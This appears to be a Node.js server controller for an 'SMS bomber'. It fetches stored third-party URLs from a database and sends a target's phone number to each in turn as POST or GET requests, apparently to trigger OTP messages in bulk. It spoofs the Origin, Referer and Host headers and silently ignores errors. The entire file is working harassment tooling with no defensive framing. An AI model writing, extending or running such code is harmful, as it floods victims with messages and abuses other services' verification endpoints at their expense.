const url = require("../Model/url");
const axios = require("axios");
const bomberFunction = async (req, res) => {
    const { number, total, skip } = req.body;
    const urlsLength = await url.find().count();
    const newSkip = skip % urlsLength;
    const urls = await url.find().skip(newSkip).limit(total);

    // if situation occurs where we  have 8 element and we skip 7 and limit to 3 then only one document recieve
    if (urls.length < total) {
        const newUrls = await url.find().limit(total - urls.length);
        urls.splice(url.length, 0, ...newUrls);
    }
    console.log(1);
    for (let i = 0; i < urls.length; i++) {
        if (urls[i].method == "post") {
            await postRequest(urls[i], number);
        } else if (urls[i].method == "get") {
            await getRequest(urls[i], number);
        }
    }

    res.json({ message: "Execution Successfull" });
};

function postRequest(urlDetails, userMobileNumber) {
    // Destructing the urlDetails;
    const { url, numberKey, mobileNumber, otherFields, otherHeaders } =
        urlDetails;
    const data = {
        [numberKey]: mobileNumber
            ? mobileNumber + String(userMobileNumber)
            : userMobileNumber,
        ...otherFields,
    };

    // Making url Object to get imp Details
    const urlObject = new URL(url);
    const headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Access-Control-Allow-Origin": "*",
        Origin: urlObject.origin,
        Referer: urlObject.origin,
        Host: urlObject.host,
        ...otherHeaders,
    };
    // Making post request
    return new Promise((resolve, reject) => {
        axios
            .post(`${url}`, data, {
                headers: headers,
            })
            .catch(() => {});

        setTimeout(() => {
            resolve(null);
        }, 1000);
    });
}

function getRequest(urlDetails, userMobileNumber) {
    // Destructing the urlDetails;
    const { url, numberKey, mobileNumber, otherFields, otherHeaders } =
        urlDetails;
    const urlParamsObject = {
        [numberKey]: mobileNumber
            ? String(mobileNumber + userMobileNumber)
            : userMobileNumber,
        ...otherFields,
    };
    const urlParams = new URLSearchParams(urlParamsObject).toString();
    const requestingUrl = `${url}${
        numberKey ? "?" + urlParams : userMobileNumber
    }`;

    // Making url Object to get imp Details
    const urlObject = new URL(url);
    const headers = {
        "Access-Control-Allow-Origin": "*",
        Origin: urlObject.origin,
        Referer: urlObject.origin,
        Host: urlObject.host,
        ...otherHeaders,
    };

    // Making post request
    return new Promise((resolve, reject) => {
        axios
            .get(`${requestingUrl}`, {
                headers: headers,
            })
            .catch(() => {});
        setTimeout(() => {
            resolve(null);
        }, 1000);
    });
}

module.exports = {
    bomberFunction,
};
